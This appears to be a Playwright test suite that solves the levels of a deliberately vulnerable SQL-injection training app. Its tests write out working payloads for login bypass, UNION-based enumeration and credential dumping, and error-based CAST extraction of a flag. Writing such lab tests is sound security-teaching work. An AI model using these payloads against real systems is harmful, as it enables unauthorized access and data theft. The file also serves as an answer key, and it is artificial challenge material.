import { test, expect } from '@playwright/test'


test.describe('Level 1-1: Login Bypass', () => {
  test('payload 1 - comment out password check', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })

  test('payload 2 - force true condition on password', async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', 'admin')
    await page.fill('#password', "' OR '1'='1")
    await page.click('[type="submit"]')
    await expect(page).not.toHaveURL(/\/login/)
  })
})

test.describe('Level 1-2: WHERE Clause Bypass', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
  })

  test('payload - comment out confidential filter', async ({ page }) => {
    await page.goto('/dashboard')
    await page.fill('.search-bar input', "' OR 1=1--")
    await page.click('.search-btn')
    await expect(page.locator('.badge-confidencial').first()).toBeVisible()
  })
})

test.describe('Level 1-3: UNION-Based DB Enumeration', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', "admin' --")
    await page.fill('#password', 'anything')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
    await page.goto('/dashboard/transfers')
  })

  test('step 1 - ORDER BY 10 succeeds (10 columns exist)', async ({ page }) => {
    await page.fill('.search-bar input', "' ORDER BY 10--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).not.toBeVisible()
  })

  test('step 2 - ORDER BY 11 errors (only 10 columns)', async ({ page }) => {
    await page.fill('.search-bar input', "' ORDER BY 11--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
  })

  test('step 3 - UNION SELECT NULLs confirms injection point', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--")
    await page.click('.search-btn')
    await expect(page.locator('.congrats-banner')).toBeVisible()
  })

  test('step 4 - enumerate tables via information_schema', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--")
    await page.click('.search-btn')
    const nameCells = page.locator('.entries-table tbody tr td:nth-child(2)')
    await expect(nameCells.filter({ hasText: 'jumentususers' }).first()).toBeVisible()
  })

  test('step 5 - enumerate columns of jumentususers', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='jumentususers'--")
    await page.click('.search-btn')
    const nameCells = page.locator('.entries-table tbody tr td:nth-child(2)')
    await expect(nameCells.filter({ hasText: 'password' }).first()).toBeVisible()
  })

  test('step 6 - dump credentials from jumentususers', async ({ page }) => {
    await page.fill('.search-bar input', "' UNION SELECT NULL,username,password,role,NULL,NULL,NULL,NULL,NULL,NULL FROM jumentususers--")
    await page.click('.search-btn')
    const rows = page.locator('.entries-table tbody tr')
    await expect(rows.filter({ hasText: 'cristiano' }).filter({ hasText: 'goat7' }).first()).toBeVisible()
  })
})

test.describe('Level 1-4: Error-Based Data Extraction', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login')
    await page.fill('#username', 'cristiano')
    await page.fill('#password', 'goat7')
    await page.click('[type="submit"]')
    await page.waitForURL(/\/dashboard/)
    await page.goto('/dashboard/perfil')
  })

  test('step 1 - true condition returns found', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=1--')
    await page.click('.search-btn')
    await expect(page.locator('.result-found')).toBeVisible()
  })

  test('step 2 - false condition returns not found (injection confirmed)', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=2--')
    await page.click('.search-btn')
    await expect(page.locator('.result-not-found')).toBeVisible()
  })

  test('step 3 - CAST error leaks table name from information_schema', async ({ page }) => {
    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
  })

  test('step 4 - CAST error leaks column name from segredos', async ({ page }) => {
    await page.fill('.lookup-bar input', "1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--")
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toBeVisible()
    await expect(page.locator('.error-msg')).toContainText('invalid input syntax for type integer')
  })

  test('step 5 - CAST error leaks flag from segredos.valor', async ({ page }) => {
    await page.fill('.lookup-bar input', '1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--')
    await page.click('.search-btn')
    await expect(page.locator('.error-msg')).toContainText('JUMENTOS{')
    await expect(page.locator('.congrats-banner')).toBeVisible()
  })
})
